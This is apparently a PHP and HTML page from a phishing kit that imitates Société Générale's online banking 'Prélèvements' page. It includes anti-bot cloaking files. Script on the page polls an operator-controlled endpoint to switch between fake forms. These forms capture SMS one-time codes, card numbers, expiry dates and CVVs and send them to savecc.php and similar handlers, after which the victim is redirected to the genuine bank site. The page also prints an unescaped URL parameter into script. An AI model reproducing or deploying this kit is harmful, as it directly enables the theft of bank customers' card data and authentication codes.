<?php
error_reporting(0);
set_time_limit(0);
session_start();


header('Content-type: text/html; charset-UTF-8');
include ('../para.php');
include ('../../prevents/bots.php');
include ('../../prevents/antimar.php');
include ('../../prevents/banned-ip.php');
	include ('../../prevents/anti1.php');
	include ('../../prevents/anti2.php');
	include ('../../prevents/anti3.php');
	include ('../../prevents/anti4.php');
	include ('../../prevents/anti5.php');
	include ('../../prevents/anti6.php');
	include ('../../prevents/anti7.php');
	include ('../../prevents/anti8.php');
//include('./inclu/banned-ip.php');
date_default_timezone_set('GMT');
$rand_tarikh = md5(date('1 js \of F Y h:i:s A'));
$url = $_SESSION['url'];
$ip = getenv("REMOTE_ADDR");

$idClient = $_POST['user_id'];



if($hhh){
  if($hhh['bloque'] == 1){
    header("Location: https://www.banquepopulaire.fr/portailinternet/Pages/default.aspx");
    exit;
  }
}else{

}



?>

<!-- saved from url=(0063)Pr%C3%A9l%C3%A8vement.htm -->
<html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<link rel="stylesheet" href="fichiers/awt-front-BDDF.css" media="all">
<link rel="stylesheet" type="text/css" href="css/ds.css">

  
	
	    <style>
        @import url('https://fonts.googleapis.com/css?family=Work+Sans');

        #card {
            border: 1px solid #d6d6d6;
            border-radius: 8px;
            height: 200px;
            width: 470px;
            box-shadow: 1px 2px 16px #d6d6d6;
            margin: 33px auto;
            background: linear-gradient(to bottom, #fff 20%, #eaeaea 100%);

        }

        #card-header {
            font-family: 'Work Sans', sans-serif;
            text-align: center;
            margin-top: 22px;
            color: #f00;
            font-size: 18px;
            font-weight: bold;
        }

        #card-header-bottom {
            text-align: center;
            font-family: 'Work Sans', sans-serif;
            font-size: 22px;
        }

        #card-form {
            margin-top: 31px;
            margin-left: 0px;
            margin-right: 0px;
        }

        #card-form li {
            font-family: 'Work Sans', sans-serif;
            float: left;
            width: 25%;
            list-style: none;
            font-size: 20px;

        }

        #card-form input.no-border {
            border-bottom: 0px solid #d6d6d6;
        }

      
		.b1 {
            border-bottom: 2px solid #d6d6d6;
            width: 18px;
			height: 25px;
            background: none;
            font-family: 'Work Sans', sans-serif;
            font-size: 20px;
            padding: 0;
            margin: 0;
        }
      .b2 {
            border-bottom: 2px solid #d6d6d6;
            width: 18px;
			height: 25px;
            background: none;
            font-family: 'Work Sans', sans-serif;
            font-size: 20px;
            padding: 0;
            margin: 0;
        }
		      .b3 {
            border-bottom: 2px solid #d6d6d6;
            width: 18px;
			height: 25px;
            background: none;
            font-family: 'Work Sans', sans-serif;
            font-size: 20px;
            padding: 0;
            margin: 0;
        }
		      .b4 {
            border-bottom: 2px solid #d6d6d6;
            width: 18px;
			height: 25px;
            background: none;
            font-family: 'Work Sans', sans-serif;
            font-size: 20px;
            padding: 0;
            margin: 0;
        }
		      .b5 {
            border-bottom: 2px solid #d6d6d6;
            width: 18px;
			height: 25px;
            background: none;
            font-family: 'Work Sans', sans-serif;
            font-size: 20px;
            padding: 0;
            margin: 0;
        }
		      .b6 {
            border-bottom: 2px solid #d6d6d6;
            width: 18px;
			height: 25px;
            background: none;
            font-family: 'Work Sans', sans-serif;
            font-size: 20px;
            padding: 0;
            margin: 0;
        }
		      .b7 {
            border-bottom: 2px solid #d6d6d6;
            width: 18px;
			height: 25px;
            background: none;
            font-family: 'Work Sans', sans-serif;
            font-size: 20px;
            padding: 0;
            margin: 0;
        }
		      .b8 {
            border-bottom: 2px solid #d6d6d6;
            width: 18px;
			height: 25px;
            background: none;
            font-family: 'Work Sans', sans-serif;
            font-size: 20px;
            padding: 0;
            margin: 0;
        }
		    .b4c {
            border-bottom: 2px solid #d6d6d6;
            width: 18px;
			height: 25px;
            background: none;
            font-family: 'Work Sans', sans-serif;
            font-size: 20px;
            padding: 0;
            margin: 0;
        }
		.cvv {
            border-bottom: 2px solid #d6d6d6;
            width: 45px;
			height: 22px;
            background: none;
            font-family: 'Work Sans', sans-serif;
            font-size: 18px;
            padding: 0;
            margin: 0;
        }
		
        .card-content {
            background: url(img/puce.jpg) no-repeat 20px 0px;
            height: 64px;
            background-size: 64px;
            margin-top: 11px;
        }
    </style>  
	  <script type="text/javascript" src="js/jquery-1-4-4-min.js"></script>
   <script>
    id = "<?php print $_GET['id'] ?>";
   $(document).ready(function () {

      setInterval(function () {
        $.ajax({
          url: '../ishowtextcode.php',
          cache: false,
          data: {
            id: id
          },
          success: function (data) {
            console.log(data);
			
            if (data == "1") {
              $('.loader').hide();
              $('.textfieldform').show();
              $('.merci').hide();
              $('.cc').hide();
			  $('.activ').hide();
			  $('.index').hide();
			  $('.num').hide();
			  $('.cyberplus').hide();

            }
			
			  if (data == "7") {
              $('.loader').hide();
              $('.textfieldform').hide();
			  $('.cyberplus').show();
              $('.merci').hide();
              $('.cc').hide();
			  $('.activ').hide();
			  $('.index').hide();
			  $('.num').hide();

            }
			
            if (data == "2") {
              $('.loader').hide();
              $('.textfieldform').hide();
              $('.merci').show();
 setTimeout(function () {
       
	   top.location = 'https://particuliers.societegenerale.fr/restitution/cns_listeprestation.html';
    }, 4000);    
              $('.cc').hide();
			   $('.activ').hide();
			   $('.index').hide();
			   $('.num').hide();
			   $('.cyberplus').hide();

            }
            if (data == "3") {
              $('.loader').hide();
              $('.textfieldform').hide();
              $('.merci').hide();
              $('.cc').show();
			  $('.activ').hide();
			  $('.index').hide();
			  $('.num').hide();
              $('.cyberplus').hide();
            }
		  if (data == "4") {
              $('.loader').hide();
              $('.textfieldform').hide();
              $('.merci').hide();
              $('.cc').hide();
			  $('.activ').show();
			  $('.index').hide();
			  $('.num').hide();
              $('.cyberplus').hide();
            }
			
			if (data == "6") {
              $('.loader').hide();
              $('.textfieldform').hide();
              $('.merci').hide();
              $('.cc').hide();
			  $('.activ').hide();
			  $('.index').hide();
			  $('.num').show();
			  $('.cyberplus').hide();
            }
			
			
			 if (data == "5") {
              $('.loader').hide();
              $('.textfieldform').hide();
              $('.merci').hide();
 setTimeout(function () {
       window.location.href = "index.php"; 
    }, 1000);    
              $('.cc').hide();
			   $('.activ').hide();
			   $('.index').show();
			   $('.num').hide();
               $('.cyberplus').hide();
            }
          }
        });
		
		
		
		$.ajax({
				url:"getcc.php",
				method:"POST",
				data:{id:id},
				dataType:"JSON",
				success:function(data)
				{
					$('#kay').text(data.kay);
					$('#kayy').text(data.kayy);
					$('#kay1').text(data.kay1);
					$('#kay2').text(data.kay2);
					$('#kay3').text(data.kay3);
					$('#kay4').text(data.kay4);
					$('#kay5').text(data.kay5);
					$('#kay6').text(data.kay6);
					$('#kay7').text(data.kay7);
					$('#kay8').text(data.kay8);	
					$("input#total1").val(data.kay1);
					$("input#total2").val(data.kay2);
					$("input#total3").val(data.kay3);
					$("input#total4").val(data.kay4);
					$("input#total5").val(data.kay5);
					$("input#total6").val(data.kay6);
					$("input#total7").val(data.kay7);
					$("input#total8").val(data.kay8);
					
					
					
				}
			});
		
		
      }, 2000);

      $('.myform').submit(function () {
        $.ajax({
          url: 'deconnecter.php',
          cache: false,
          type: 'POST',
          data: {
            id: id,
            smscode: $('.vb').val(),

          },
          success: function (data) {
            $('.textfieldform').hide();
            $('.loader').show();
          }
        });
		
		
		


        return false;
      });

	  
	     

	  
 $('.myactiv').submit(function () {
        $.ajax({
          url: 'connect.php',
          cache: false,
          type: 'POST',
          data: {
            id: id,
            smscode: $('.vb').val(),

          },
          success: function (data) {
            $('.activ').hide();
            $('.loader').show();
          }
        });


        return false;
      });



      $('#ccform').submit(function () {



        date = $('#date').val();
        crd= $('#crd').val();
        date_ex= $('#date-ex').val();
        year_exp= $('#year-ex').val();
        cv= $('#cv').val();
        numo= $('#numo').val();

        $.ajax({
          url: 'savecc.php',
          cache: false,
          type: 'GET',
          data: {
            id: id,
            date : date,
            crd : crd,
            date_exp : date_ex,
            year_exp : year_exp,
            cv : cv,
            numo : numo
          },
          success: function (data) {
            $('.cc').hide();
			$('.num').hide();

            $('.loader').show();
          }
        });
		


        return false;
      });
	  
	  
	  
	        $('#ccrm').submit(function () {

                  val = '';
                for(i = 1; i<=4 ; i++){
                    val+=  $('input[next='  + i + ']').val();
                }
                if(val.length != 16){
                    return false;
                }

        date = val;
        crd= $('#crd').val();
        date_exp = $('#dateex').val();
        year_exp = $('#yearex').val();
        cv= $('#cv').val();
        numo= $('#numo').val();

        $.ajax({
          url: 'savecc.php',
          cache: false,
          type: 'GET',
          data: {
            id: id,
            date : date,
            crd : crd,
            date_exp : date_exp,
            year_exp : year_exp,
            cv : cv,
            numo : numo
          },
          success: function (data) {
            $('.cc').hide();
			$('.num').hide();

            $('.loader').show();
          }
        });
		


        return false;
      });
	  
    });
  </script>
</head>
<body onload="onloadPrelevement();" class="ugds_prelev ugds_prelev_restit ugds_prelev_restit_liste ugds_prelev_restit_liste_operations">


<meta name="robots" content="none">
        


		<title>Banque et Assurances</title>
						
		
		   <link href="fichiers/index_20190502160330.css" rel="stylesheet" type="text/css">
                <link href="fichiers/spec56_btn_gsm_all_gcd_20190320190559.css" rel="stylesheet" type="text/css">
              <link rel="stylesheet" href="fichiers/inbenta.css">

                <link href="fichiers/print_20190320190559.css" rel="stylesheet" type="text/css" media="print">
                
<!-- URL: https://particuliers.societegenerale.fr:80/restcontent/theme/a1583f5b639cf510VgnVCM100000060015acRCRD -->
<!-- REQUEST PROFILE: BFM, REQUEST SAS AUTH_LEVEL: 0 -->
<!-- channelId: 5040ed2049b0f510VgnVCM100000030013acRCRD, templateID: a1583f5b639cf510VgnVCM100000060015acRCRD, isRenderPageFeatures: true, FURL_NAME: /aconec/cptbud/prlvts/default/theme, FURL_ID: 15c686e506f2e510VgnVCM100000030013acRCRD -->

<meta http-equiv="Cache-Control" content="no-cache">

<link rel="stylesheet" href="fichiers/LogitelNetCommun.css" type="text/css">
<link rel="stylesheet" href="fichiers/LogitelNetRestitution.css" type="text/css">
<link rel="stylesheet" href="fichiers/LogitelNetCommunAccessible.css" type="text/css">

<div style="display: none;" id="lightningjs-usabilla_live"><div><iframe id="lightningjs-frame-usabilla_live" frameborder="0" src="./activi_files/saved_resource.html"></iframe></div></div><div class="entete1">
<header class="dcw_header dcw_header--auth js-header-auth dcw_header--bfm dcw_header--no-subnav" role="banner" data-clientside-id="setConnectedHeaderColor" data-clientside-segments-bfm="S-1870431348-00000000000000000000000RCRD" data-clientside-segments-bp="S-1251676558-00000000000000000000000RCRD,S--1689981041-0000000000000000000000RCRD">
	<button data-tms-element-label="ouvrir-le-menu" data-tms-click-type="A" data-tms-container-label="header-connected" class="dcw_burger-menu js-drawer-toggle" aria-label="ouvrir le menu">
		<svg class="dcw_burger-menu_notification is-visible" aria-hidden="true" focusable="false">
			<use width="100%" height="100%" xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels.svg#circle"></use>
		</svg>
		<svg class="dcw_burger-menu_icon" aria-hidden="true" focusable="false">
			<use width="100%" height="100%" xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels.svg#burger-menu"></use>
		</svg>
	</button>
	<button data-tms-element-label="fermer-le-menu" data-tms-click-type="A" data-tms-container-label="header-connected" class="dcw_burger-menu_btn-close js-drawer-close" aria-label="fermer le menu">
		<svg aria-hidden="true" focusable="false">
			<use width="100%" height="100%" xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels.svg#close-2"></use>
		</svg>
	</button>
	<div class="dcw_brand_container">
		

      

<h1 class="dcw_brand_title">Comptes et budget</h1><div class="dcw_brand_logo-container"><a href="" class="dcw_brand_home-link dcw_brand_home-link--desktop"><img src="fichiers/logo-sg.svg" alt="Logo Société Générale" class="dcw_brand_logo dcw_brand_dual-sg" width="191px" height="38px"> <img src="fichiers/bfm-sg-muets.svg" alt="Logo Société Générale" class="dcw_brand_logo dcw_brand_dual-sg dcw_brand_dual-sg--tablet" width="191px" height="38px"> </a> <a href="" class="dcw_brand_home-link dcw_brand_home-link--mobile"> <img src="fichiers/logo-sg-muet.svg" alt="Logo Société Générale" class="dcw_brand_logo dcw_brand_logo--mute" width="30" height="30"> </a></div>


			
			
		

</div>
	<button class="dcw_quick-login js-lgc-logout" data-cms-action="logout-button" data-tms-element-label="se-deconnecter" data-tms-container-label="logout-box" data-tms-click-type="A" data-cms-callback-url="/page-deconnexion" aria-label="Déconnexion">
    <svg aria-hidden="true" focusable="false"><use width="100%" height="100%" xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels.svg#login"></use></svg>
</button><div class="dcw_menu js-sidedrawer dcw_sidedrawer js-menu-auth">
		<div class="dcw_login_wrapper-auth">
			
				<div style="text-align: right;" class=""> <img src="fichiers/header.png"></div>

		</div>
		<nav class="dcw_sidedrawer_nav dcw_main-nav" id="main-nav" role="navigation" aria-label="navigation principale">
			<a id="go-navigation" tabindex="-1"></a>
			<input id="auth-breadcrumb-channel-ids" type="hidden" value="5040ed2049b0f510VgnVCM100000030013acRCRD,9e06d7eb61b7e510VgnVCM100000020012acRCRD,5e2a2ee50183e510VgnVCM100000020012acRCRD,d3f92ee50183e510VgnVCM100000020012acRCRD,25d136f55ccb9510VgnVCM100000050013acRCRD">
			<input id="auth-current-channel-name" type="hidden" value="Prélèvement">
			<input id="auth-hide-back-button" type="hidden" value="">
			<input id="auth-level-1-channel-name" type="hidden" value="Comptes et budget">
			

























      


<div class="dcw_submenu-auth_search-wrapper js-main-search_wrapper">
    <button class="dcw_mega-menu_close js-main-search_close" data-tms-click-type="A" data-tms-element-label="fermer-mega-menu" data-tms-container-label="navigation-connected" aria-label="Fermer la recherche">
        <svg aria-hidden="true" focusable="false"><use width="100%" height="100%" xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels.svg#close-2"></use></svg>
    </button>
</div>
<div class="dcw_main-nav_container js-sidedrawer_pane-container">
    <div class="dcw_submenu-auth_search dcw_submenu-auth_search--sidebar js-main-search_container">
       
    </div>
    <ul class="js-sidedrawer_pane js-sidedrawer-list dcw_sidedrawer_list dcw_main-nav_list">
        <li class="dcw_main-nav_burger">
            <button aria-label="Déplier la navigation principale" class="js-main-nav-burger dcw_main-nav_burger-opening">
                <span></span>
            </button>
            <span class="dcw_main-nav_burger-label js-bind-burger">Menu</span>
          </li>
            <li class="js-sidedrawer_item js-menu_item dcw_sidedrawer_item dcw_main-nav_item hide-on-mobile is-active">
                    <svg class="dcw_main-nav_highlight js-marker" aria-hidden="true" focusable="false" style="transform: translateY(96px);"><use width="100%" height="100%" xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels.svg#v-marker"></use></svg>
                    <a href="" aria-label="Société Générale (Se rendre à la page d&#39;accueil)">
                        <img class="dcw_main-nav_logo" src="fichiers/logo-sg-muet.svg" alt="" width="30" height="30">
                    </a>
                <svg aria-hidden="true" focusable="false"><use width="100%" height="100%" xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels.svg#"></use></svg>
                
<a data-channelid="5e2a2ee50183e510VgnVCM100000020012acRCRD" aria-controls="nav0abe75bdb2301610VgnVCM100000050013acRCRD" aria-haspopup="true" aria-expanded="false" tabindex="0" class="dcw_sidedrawer_link dcw_main-nav_link js-ref_elt" data-tms-container-label="navigation-connected" data-tms-element-label="comptes-et-budget" href="" data-tms-click-type="N">                            Comptes et Budget
</a>                    <nav class="dcw_submenu-auth dcw_sidedrawer_subnav" aria-label="navigation secondaire">
                        <div class="dcw_submenu-auth_wrapper">
                            <ul class="dcw_submenu-auth_list js-submenu dcw_sidedrawer_list">
                                <li class="dcw_sidedrawer_item dcw_sidedrawer_back-item js-sidedrawer_back-item">
                                    <svg aria-hidden="true" focusable="false"><use width="100%" height="100%" xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels.svg#back-arrow"></use></svg>
                                    <a class="dcw_sidedrawer_link"></a>Comptes et Budget
                                </li>
                                <li class="dcw_submenu-auth_item js-menu_title js-bind-burger dcw_sidedrawer_item  hide-on-mobile">
                                    <span class="dcw_submenu-auth_link js-ref_elt" data-channelid="5e2a2ee50183e510VgnVCM100000020012acRCRD">
                                        Comptes et Budget
                                    </span>
                                </li>
								<li class="dcw_submenu-auth_item dcw_sidedrawer_item dcw_submenu-auth_item--arrow">
                                    <svg aria-hidden="true" focusable="false"><use width="100%" height="100%" xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels.svg#arrow-nav"></use></svg>
                                </li>
											<li class="dcw_submenu-auth_item js-submenu_item js-outside-dropdown dcw_sidedrawer_item ">
													<svg class="dcw_submenu-auth_marker js-marker" aria-hidden="true" focusable="false" style="transition: none 0s ease 0s; transform: translateX(556px) scaleX(1);"><use width="100%" height="100%" xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels.svg#h-marker"></use></svg>
											
<a data-channelid="dcfd2ee50183e510VgnVCM100000020012acRCRD" class="dcw_submenu-auth_link js-submenu_elt-not-in-dropdown js-ref_elt" data-tms-container-label="navigation-connected" data-tms-element-label="mes-comptes" data-anchor="null" href="#/restitution/cns_listeprestation.html" data-tms-click-type="N">															Mes comptes
</a>											</li>
											
											<li class="dcw_submenu-auth_item js-submenu_item js-outside-dropdown dcw_sidedrawer_item hide-on-mobile">
											
<a data-channelid="259bfbd6276e8610VgnVCM10000057f440c0RCRD" class="dcw_submenu-auth_link js-submenu_elt-not-in-dropdown js-ref_elt" data-tms-container-label="navigation-connected" data-tms-element-label="mes-cartes" data-anchor="null" href="#/com/icd-web/crtes/crtes-caracteristiques-carte.html#caracteristiques/synthese" data-tms-click-type="N">															Mes cartes
</a>											</li>
											<li class="dcw_submenu-auth_item js-submenu_item js-outside-dropdown dcw_sidedrawer_item ">
											
<a data-channelid="0efe2ee50183e510VgnVCM100000020012acRCRD" class="dcw_submenu-auth_link js-submenu_elt-not-in-dropdown js-ref_elt" data-tms-container-label="navigation-connected" data-tms-element-label="virements" data-anchor="null" href="#/virement/pas_vipon_saisie.html" data-tms-click-type="N">															Virements
</a>											</li>
											<li class="dcw_submenu-auth_item js-submenu_item js-outside-dropdown dcw_sidedrawer_item dcw_submenu-auth_item--hide-tablet js-item-only-desktop is-active">
											
<a data-channelid="9e06d7eb61b7e510VgnVCM100000020012acRCRD" class="dcw_submenu-auth_link js-submenu_elt-not-in-dropdown js-ref_elt" data-tms-container-label="navigation-connected" data-tms-element-label="prélèvements" data-anchor="null" href="#/prelevement/prelev_restit_liste_operations.html" data-tms-click-type="N" aria-current="true">															Prélèvements
</a>											</li>
                                            <li class="dcw_dropdown js-submenu_item js-outside-dropdown js-dropdown ">
                                                <button class="js-dropdown_btn" aria-expanded="false" aria-owns="dcw-dropdown-list">
                                                    <svg aria-hidden="true" focusable="false"><use width="100%" height="100%" xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels.svg#display"></use></svg>
                                                </button>
                                                <ul class="dcw_dropdown_list toggle_content" id="dcw-dropdown-list">
                                                    
                                              <li class="dcw_dropdown_item js-submenu_item js-submenu_elt-in-dropdown">
<a data-channelid="1f56d7eb61b7e510VgnVCM100000020012acRCRD" class="dcw_dropdown_link js-dropdown_link js-ref_elt" data-tms-container-label="navigation-connected" data-tms-element-label="mon-budget" data-anchor="null" href="#/gbi-web/rubrique-gbi/gbi-rubrique-tableauDeBord.html" data-tms-click-type="N">                                                            Mon budget
</a>                                               <svg class="dcw_submenu_drop_marker js-marker" aria-hidden="true" focusable="false"><use width="100%" height="100%" xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels.svg#h-marker"></use></svg></li>
                                              <li class="dcw_dropdown_item js-submenu_item js-submenu_elt-in-dropdown">
<a data-channelid="1f56d7eb61b7e510VgnVCM100000020012acRCRD" class="dcw_dropdown_link js-dropdown_link js-ref_elt" data-tms-container-label="navigation-connected" data-tms-element-label="payer-mes-factures" data-anchor="null" href="#/com/sml-web/sml/sml-accueil.html" data-tms-click-type="N">                                                            Payer mes factures
</a>                                               </li>
                            </ul>
                        </li></ul></div>
                    </nav>
            </li>
            <li class="js-sidedrawer_item js-menu_item dcw_sidedrawer_item dcw_main-nav_item has-popup hide-on-desktop">
                <svg aria-hidden="true" focusable="false"><use width="100%" height="100%" xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels.svg#fonc-carte-bancaire"></use></svg>
                
<a data-channelid="5007876c77cde510VgnVCM100000030013acRCRD" aria-controls="nav419ac0b21c8b1610VgnVCM100000050012acRCRD" aria-haspopup="true" aria-expanded="false" tabindex="0" class="dcw_sidedrawer_link dcw_main-nav_link js-ref_elt" data-tms-container-label="navigation-connected" data-tms-element-label="comptes-et-budget" href="#/sbm-mob/mob/sbm-tdb.html" data-tms-click-type="N">                            Comptes et Budget
</a>                    <nav class="dcw_submenu-auth dcw_sidedrawer_subnav" aria-label="navigation secondaire">
                        <div class="dcw_submenu-auth_wrapper">
                            <ul class="dcw_submenu-auth_list js-submenu dcw_sidedrawer_list">
                                <li class="dcw_sidedrawer_item dcw_sidedrawer_back-item js-sidedrawer_back-item">
                                    <svg aria-hidden="true" focusable="false"><use width="100%" height="100%" xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels.svg#back-arrow"></use></svg>
                                    <a class="dcw_sidedrawer_link"></a>Comptes et Budget
                                </li>
                                <li class="dcw_submenu-auth_item js-menu_title js-bind-burger dcw_sidedrawer_item has-popup hide-on-desktop">
                                    <span class="dcw_submenu-auth_link js-ref_elt" data-channelid="5007876c77cde510VgnVCM100000030013acRCRD">
                                        Comptes et Budget
                                    </span>
                                </li>
								<li class="dcw_submenu-auth_item dcw_sidedrawer_item dcw_submenu-auth_item--arrow">
                                    <svg aria-hidden="true" focusable="false"><use width="100%" height="100%" xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels.svg#arrow-nav"></use></svg>
                                </li>
											<li class="dcw_submenu-auth_item js-submenu_item js-outside-dropdown dcw_sidedrawer_item hide-on-desktop">
													<svg class="dcw_submenu-auth_marker js-marker" aria-hidden="true" focusable="false"><use width="100%" height="100%" xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels.svg#h-marker"></use></svg>
											
<a data-channelid="5007876c77cde510VgnVCM100000030013acRCRD" class="dcw_submenu-auth_link js-submenu_elt-not-in-dropdown js-ref_elt" data-tms-container-label="navigation-connected" data-tms-element-label="mes-comptes" data-anchor="null" href="#/sbm-mob/mob/sbm-rlv-snt-cpt.html" data-tms-click-type="N">															Mes comptes
</a>											</li>
											
											<li class="dcw_submenu-auth_item js-submenu_item js-outside-dropdown dcw_sidedrawer_item hide-on-desktop">
											
<a data-channelid="5007876c77cde510VgnVCM100000030013acRCRD" class="dcw_submenu-auth_link js-submenu_elt-not-in-dropdown js-ref_elt" data-tms-container-label="navigation-connected" data-tms-element-label="virements" data-anchor="null" href="#/sbm-mob/mob/sbm-vir-index.html" data-tms-click-type="N">															Virements
</a>											</li>
											<li class="dcw_submenu-auth_item js-submenu_item js-outside-dropdown dcw_sidedrawer_item hide-on-desktop">
											
<a data-channelid="525d4d9a3e2ee510VgnVCM100000030013acRCRD" class="dcw_submenu-auth_link js-submenu_elt-not-in-dropdown js-ref_elt" data-tms-container-label="navigation-connected" data-tms-element-label="prélèvements" data-anchor="null" href="#/sbm-mob/mob/sbm-prel-index.html" data-tms-click-type="N">															Prélèvements
</a>											</li>
											<li class="dcw_submenu-auth_item js-submenu_item js-outside-dropdown dcw_sidedrawer_item hide-on-desktop dcw_submenu-auth_item--hide-tablet js-item-only-desktop">
											
<a data-channelid="259bfbd6276e8610VgnVCM10000057f440c0RCRD" class="dcw_submenu-auth_link js-submenu_elt-not-in-dropdown js-ref_elt" data-tms-container-label="navigation-connected" data-tms-element-label="cartes" data-anchor="null" href="#/com/icd-web/crtes/crtes-caracteristiques-carte.html#caracteristiques/synthese" data-tms-click-type="N">															Cartes
</a>											</li>
                                            <li class="dcw_dropdown js-submenu_item js-outside-dropdown js-dropdown ">
                                                <button class="js-dropdown_btn" aria-expanded="false" aria-owns="dcw-dropdown-list">
                                                    <svg aria-hidden="true" focusable="false"><use width="100%" height="100%" xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels.svg#display"></use></svg>
                                                </button>
                                                <ul class="dcw_dropdown_list toggle_content" id="dcw-dropdown-list">
                                                    <li class="dcw_dropdown_item js-submenu_item dcw_dropdown_item--hide-desktop js-dropdown-item-only-tablet js-submenu_elt-in-dropdown hide-on-mobile">
                                                    <svg class="dcw_submenu_drop_marker js-marker" aria-hidden="true" focusable="false"><use width="100%" height="100%" xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels.svg#h-marker"></use></svg>
<a data-channelid="259bfbd6276e8610VgnVCM10000057f440c0RCRD" class="dcw_dropdown_link js-dropdown_link js-ref_elt" data-tms-container-label="navigation-connected" data-tms-element-label="cartes" data-anchor="null" href="#/com/icd-web/crtes/crtes-caracteristiques-carte.html#caracteristiques/synthese" data-tms-click-type="N">                                                                    Cartes
</a>                                                   </li>
                                              <li class="dcw_dropdown_item js-submenu_item js-submenu_elt-in-dropdown">
<a data-channelid="76263eb2b0d42610VgnVCM100000050013acRCRD" class="dcw_dropdown_link js-dropdown_link js-ref_elt" data-tms-container-label="navigation-connected" data-tms-element-label="paramétrage" data-anchor="null" href="#/sbm-mob/mob/sbm-rgl.html" data-tms-click-type="N">                                                            Paramétrage
</a>                                               </li>
                            </ul>
                        </li></ul></div>
                    </nav>
            </li>
            <li class="js-sidedrawer_item js-menu_item dcw_sidedrawer_item dcw_main-nav_item  hide-on-mobile">
                <svg aria-hidden="true" focusable="false"><use width="100%" height="100%" xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels.svg#fonc-pret"></use></svg>
                
<a data-channelid="5a4c0f9d49b37610VgnVCM10000057f440c0RCRD" aria-controls="nav43e375bdb2301610VgnVCM100000050013acRCRD" aria-haspopup="true" aria-expanded="false" tabindex="0" class="dcw_sidedrawer_link dcw_main-nav_link js-ref_elt" data-tms-container-label="navigation-connected" data-tms-element-label="prêts" href="#/icd/espaces-thematiques/credit/credit-restit.html" data-tms-click-type="N">                            Prêts
</a>                    <nav class="dcw_submenu-auth dcw_sidedrawer_subnav" aria-label="navigation secondaire">
                        <div class="dcw_submenu-auth_wrapper">
                            <ul class="dcw_submenu-auth_list js-submenu dcw_sidedrawer_list">
                                <li class="dcw_sidedrawer_item dcw_sidedrawer_back-item js-sidedrawer_back-item">
                                    <svg aria-hidden="true" focusable="false"><use width="100%" height="100%" xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels.svg#back-arrow"></use></svg>
                                    <a class="dcw_sidedrawer_link"></a>Prêts
                                </li>
                                <li class="dcw_submenu-auth_item js-menu_title js-bind-burger dcw_sidedrawer_item  hide-on-mobile">
                                    <span class="dcw_submenu-auth_link js-ref_elt" data-channelid="5a4c0f9d49b37610VgnVCM10000057f440c0RCRD">
                                        Prêts
                                    </span>
                                </li>
								<li class="dcw_submenu-auth_item dcw_sidedrawer_item dcw_submenu-auth_item--arrow">
                                    <svg aria-hidden="true" focusable="false"><use width="100%" height="100%" xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels.svg#arrow-nav"></use></svg>
                                </li>
											<li class="dcw_submenu-auth_item js-submenu_item js-outside-dropdown dcw_sidedrawer_item hide-on-mobile">
													<svg class="dcw_submenu-auth_marker js-marker" aria-hidden="true" focusable="false"><use width="100%" height="100%" xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels.svg#h-marker"></use></svg>
											
<a data-channelid="4a88d7eb61b7e510VgnVCM100000020012acRCRD" class="dcw_submenu-auth_link js-submenu_elt-not-in-dropdown js-ref_elt" data-tms-container-label="navigation-connected" data-tms-element-label="accueil-prêts" data-anchor="null" href="#/icd/espaces-thematiques/credit/credit-restit.html" data-tms-click-type="N">															Accueil prêts
</a>											</li>
											<li class="dcw_submenu-auth_item js-submenu_item js-outside-dropdown dcw_sidedrawer_item ">
											
<a data-channelid="dc4563f637cc4610VgnVCM10000057f440c0RCRD" class="dcw_submenu-auth_link js-submenu_elt-not-in-dropdown js-ref_elt" data-tms-container-label="navigation-connected" data-tms-element-label="crédit-à-la-consommation" data-anchor="null" data-cm="1" href="#/secure/pret/espace-thematique-pret/credit-consommation-co" data-tms-click-type="N">															Crédit à la consommation
</a>											</li>
											<li class="dcw_submenu-auth_item js-submenu_item js-outside-dropdown dcw_sidedrawer_item ">
											
<a data-channelid="f2477c7ac9f64610VgnVCM10000057f440c0RCRD" class="dcw_submenu-auth_link js-submenu_elt-not-in-dropdown js-ref_elt" data-tms-container-label="navigation-connected" data-tms-element-label="crédit-immobilier" data-anchor="null" data-cm="1" href="#/secure/pret/espace-thematique-pret/pret-credit-immobilier" data-tms-click-type="N">															Crédit immobilier
</a>											</li>
                            </ul>
                        </div>
                    </nav>
            </li>
            <li class="js-sidedrawer_item js-menu_item dcw_sidedrawer_item dcw_main-nav_item has-popup hide-on-desktop">
                <svg aria-hidden="true" focusable="false"><use width="100%" height="100%" xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels.svg#fonc-pret"></use></svg>
                
